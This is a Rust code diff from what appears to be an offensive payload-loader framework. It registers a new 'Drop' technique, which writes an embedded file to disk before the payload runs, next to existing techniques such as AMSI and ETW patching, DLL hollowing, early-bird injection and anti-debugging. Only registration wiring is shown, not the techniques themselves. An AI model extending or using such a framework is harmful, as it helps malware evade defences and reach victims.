@@ -10,6 +10,7 @@ pub mod anti_debug;
 pub mod bouncer;
 pub mod dll_hollowing;
 pub mod dotnet_hosting;
+pub mod drop;
 pub mod early_bird;
 pub mod erase_pe_header;
 pub mod execution_callbacks;
@@ -126,6 +127,13 @@ pub enum TechniqueKind {
         /// Technique parameters (the declared checks).
         #[serde(default)]
         params: bouncer::Params,
+    },
+    /// Write an embedded `format: plain` file to a path, before the payload runs
+    /// (preparation).
+    Drop {
+        /// Technique parameters (the destination and the asset).
+        #[serde(default)]
+        params: drop::Params,
     },
     /// Patch the AMSI scan exports in the current process (preparation).
     PatchAmsi {
@@ -349,6 +357,7 @@ impl TechniqueKind {
             TechniqueKind::AntiDebug { params } => params.render_fragment(strings),
             TechniqueKind::HideThreadFromDebugger { params } => params.render_fragment(strings),
             TechniqueKind::Bouncer { params } => params.render_fragment(strings),
+            TechniqueKind::Drop { params } => params.render_fragment(strings),
             TechniqueKind::PatchAmsi { params } => params.render_fragment(strings),
             TechniqueKind::PatchEtw { params } => params.render_fragment(strings),
             TechniqueKind::HardwareBreakpoints { params } => params.render_fragment(strings),
@@ -406,6 +415,7 @@ impl TechniqueKind {
             TechniqueKind::AntiDebug { .. } => anti_debug::DEF.name,
             TechniqueKind::HideThreadFromDebugger { .. } => hide_thread_from_debugger::DEF.name,
             TechniqueKind::Bouncer { .. } => bouncer::DEF.name,
+            TechniqueKind::Drop { .. } => drop::DEF.name,
             TechniqueKind::PatchAmsi { .. } => patch_amsi::DEF.name,
             TechniqueKind::PatchEtw { .. } => patch_etw::DEF.name,
             TechniqueKind::HardwareBreakpoints { .. } => hardware_breakpoints::DEF.name,
@@ -482,6 +492,7 @@ impl TechniqueKind {
             TechniqueKind::AntiDebug { .. } => anti_debug::DEF.category,
             TechniqueKind::HideThreadFromDebugger { .. } => hide_thread_from_debugger::DEF.category,
             TechniqueKind::Bouncer { .. } => bouncer::DEF.category,
+            TechniqueKind::Drop { .. } => drop::DEF.category,
             TechniqueKind::PatchAmsi { .. } => patch_amsi::DEF.category,
             TechniqueKind::PatchEtw { .. } => patch_etw::DEF.category,
             TechniqueKind::HardwareBreakpoints { .. } => hardware_breakpoints::DEF.category,
@@ -716,6 +727,7 @@ pub fn all() -> &'static [TechniqueDef] {
         process_mitigations::DEF,
         sleep_obfuscation::DEF,
         bouncer::DEF,
+        drop::DEF,
         living_off_the_land::DEF,
         sleep::DEF,
         network_stager::DEF,
